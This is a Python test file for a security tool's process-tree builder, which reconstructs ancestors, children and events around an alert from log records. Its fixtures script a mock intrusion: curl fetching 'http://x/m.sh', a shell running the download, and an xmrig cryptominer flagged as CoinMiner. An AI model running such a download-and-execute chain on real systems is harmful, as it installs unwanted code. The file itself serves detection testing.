# tests/server-api/test_process_tree.py
"""The process tree around an alert (services/process_tree.py) against an
in-memory logs index: ancestors, children and grandchildren, pid reuse,
events assigned to the right process, and what is shown without telemetry."""
import asyncio
from datetime import datetime, timedelta, timezone

from app.services import process_tree

T0 = datetime(2026, 11, 2, 10, 0, tzinfo=timezone.utc)
AGENT = "agent-1"


def at(seconds: int) -> str:
    return (T0 + timedelta(seconds=seconds)).isoformat()


def _get(doc: dict, field: str):
    if field.startswith("decoded_fields."):
        return (doc.get("decoded_fields") or {}).get(field[len("decoded_fields."):])
    return doc.get(field)


def _matches(doc: dict, clause: dict) -> bool:
    if "bool" in clause:
        b = clause["bool"]
        if not all(_matches(doc, c) for c in b.get("filter", [])):
            return False
        should = b.get("should", [])
        return not should or sum(_matches(doc, c) for c in should) >= b.get("minimum_should_match", 1)
    if "term" in clause:
        (f, v), = clause["term"].items()
        return _get(doc, f) == v
    if "terms" in clause:
        (f, vs), = clause["terms"].items()
        return _get(doc, f) in vs
    if "match" in clause:
        (f, v), = clause["match"].items()
        return str(_get(doc, f)) == str(v)
    if "range" in clause:
        (f, r), = clause["range"].items()
        t = datetime.fromisoformat(_get(doc, f))
        return (("gte" not in r or t >= datetime.fromisoformat(r["gte"]))
                and ("lte" not in r or t <= datetime.fromisoformat(r["lte"])))
    raise AssertionError(f"unsupported clause {clause}")


class Index:
    def __init__(self, docs):
        self.docs = docs
        self.queries = 0

    async def search(self, query, size=25, sort=None, search_after=None):
        self.queries += 1
        hits = [d for d in self.docs if _matches(d, query)]
        desc = bool(sort) and list(sort[0].values())[0] == "desc"
        hits.sort(key=lambda d: d["created_at"], reverse=desc)
        return hits[:size], len(hits), None


def exec_(id, t, pid, ppid, image, parent_image="", cmd="", agent=AGENT):
    return {"id": id, "agent_id": agent, "log_type": "linux_process_exec", "decoder": "linux_process_exec",
            "created_at": at(t), "decoded_fields": {"ProcessId": str(pid), "ParentProcessId": str(ppid),
                                                    "Image": image, "ParentImage": parent_image,
                                                    "CommandLine": cmd or image, "User": "1000"}}


def activity(id, t, log_type, pid, **fields):
    return {"id": id, "agent_id": AGENT, "log_type": log_type, "created_at": at(t),
            "decoded_fields": {"process.pid": str(pid), **fields}}


def docs():
    return [
        # an older process that had the same pids (reuse) and another agent's look-alike
        exec_("old-bash", -7200, 1000, 50, "/bin/bash"),
        exec_("old-curl", -3600, 1100, 999, "/usr/bin/curl"),
        exec_("other-agent", 5, 1200, 1100, "/bin/sh", agent="agent-2"),
        exec_("sshd", -600, 800, 1, "/usr/sbin/sshd", "/usr/lib/systemd/systemd"),
        exec_("bash", -300, 1000, 800, "/bin/bash", "/usr/sbin/sshd"),
        exec_("curl", -10, 1100, 1000, "/usr/bin/curl", "/bin/bash", "curl -s http://x/m.sh"),
        exec_("sh", 2, 1200, 1100, "/bin/sh", "/usr/bin/curl", "sh -c ./m"),
        exec_("xmrig", 4, 1300, 1200, "/tmp/xmrig", "/bin/sh"),
        exec_("unrelated", 3, 1400, 1, "/usr/bin/cron"),
        activity("old-net", -3500, "linux_network_connect", 1100, **{"destination.address": "10.0.0.9"}),
        activity("net", 0, "linux_network_connect", 1100, **{"destination.address": "203.0.113.7",
                                                            "destination.port": "443"}),
        activity("dns", -1, "linux_dns_query", 1100, **{"dns.question.name": "x.example"}),
        activity("drop", 3, "linux_file_event", 1200, **{"file.path": "/tmp/xmrig", "file.action": "write"}),
        activity("exit", 30, "linux_process_exit", 1200, **{"process.exit_code": "0"}),
        activity("km", 5, "known_malware", 1300, **{"malware.label": "CoinMiner", "malware.action": "detected",
                                                    "file.hash.sha256": "ab" * 32}),
    ]


def run(coro):
    return asyncio.run(coro)


def test_tree_around_alert_process():
    idx = Index(docs())
    alert_event = activity("alert-ev", 0, "linux_network_connect", 1100)
    tree = run(process_tree.build(idx.search, AGENT, alert_event, T0))
    by = {n["id"]: n for n in tree["nodes"]}
    assert tree["anchor"] == "curl" and by["curl"]["anchor"]
    # ancestors: the latest start of each pid before its child, then a placeholder for pid 1
    assert by["curl"]["parent_id"] == "bash" and by["bash"]["parent_id"] == "sshd"
    assert by["sshd"]["parent_id"] == "parent:1"
    assert by["parent:1"]["image"] == "/usr/lib/systemd/systemd" and by["parent:1"]["synthetic"]
    assert "old-bash" not in by and "old-curl" not in by and "other-agent" not in by and "unrelated" not in by
    # descendants
    assert by["sh"]["parent_id"] == "curl" and by["sh"]["depth"] == 1
    assert by["xmrig"]["parent_id"] == "sh" and by["xmrig"]["depth"] == 2
    # events go to the process that had the pid then
    assert [e["id"] for e in by["curl"]["events"]] == ["dns", "net"]
    assert by["curl"]["events"][1]["destination"] == "203.0.113.7" and by["curl"]["counts"] == {"dns": 1, "network": 1}
    assert by["sh"]["events"][0]["path"] == "/tmp/xmrig" and by["sh"]["exited"] == at(30)
    assert by["xmrig"]["events"][0]["label"] == "CoinMiner"
    assert [n["depth"] for n in tree["nodes"]] == sorted(n["depth"] for n in tree["nodes"])
    assert tree["notes"] == []


def test_without_process_start_shows_the_event_process():
    idx = Index([activity("net", 0, "linux_network_connect", 4242)])
    ev = {"id": "e1", "created_at": at(0), "log_type": "windows_etw_network",
          "decoded_fields": {"process.pid": "4242", "Image": "C:\\x.exe", "file.hash.sha256": "CD" * 32}}
    tree = run(process_tree.build(idx.search, AGENT, ev, T0))
    anchor = tree["nodes"][0]
    assert anchor["synthetic"] and anchor["image"] == "C:\\x.exe" and anchor["sha256"] == "cd" * 32
    assert anchor["events"][0]["id"] == "net"
    assert "No process start" in tree["notes"][0]


def test_sysmon_hashes_and_nothing_to_show():
    sysmon = {"id": "s1", "agent_id": AGENT, "log_type": "windows_sysmon", "decoder": "win_sysmon_1_process_created",
              "created_at": at(-5), "decoded_fields": {"ProcessId": "77", "ParentProcessId": "4", "Image": "C:\\m.exe",
                                                       "Hashes": "MD5=00,SHA256=" + "EF" * 32 + ",IMPHASH=11"}}
    tree = run(process_tree.build(Index([sysmon]).search, AGENT,
                                  {"id": "a", "created_at": at(0), "decoded_fields": {"ProcessId": "77"}}, T0))
    by = {n["id"]: n for n in tree["nodes"]}
    assert tree["anchor"] == "s1" and by["s1"]["sha256"] == "ef" * 32
    assert tree["nodes"][0]["id"] == "parent:4"  # ancestors first

    assert run(process_tree.build(Index([]).search, None, None, T0))["nodes"] == []
    no_pid = run(process_tree.build(Index([]).search, AGENT, {"decoded_fields": {"source.ip": "1.2.3.4"}}, T0))
    assert no_pid["nodes"] == [] and "no pid" in no_pid["notes"][0]
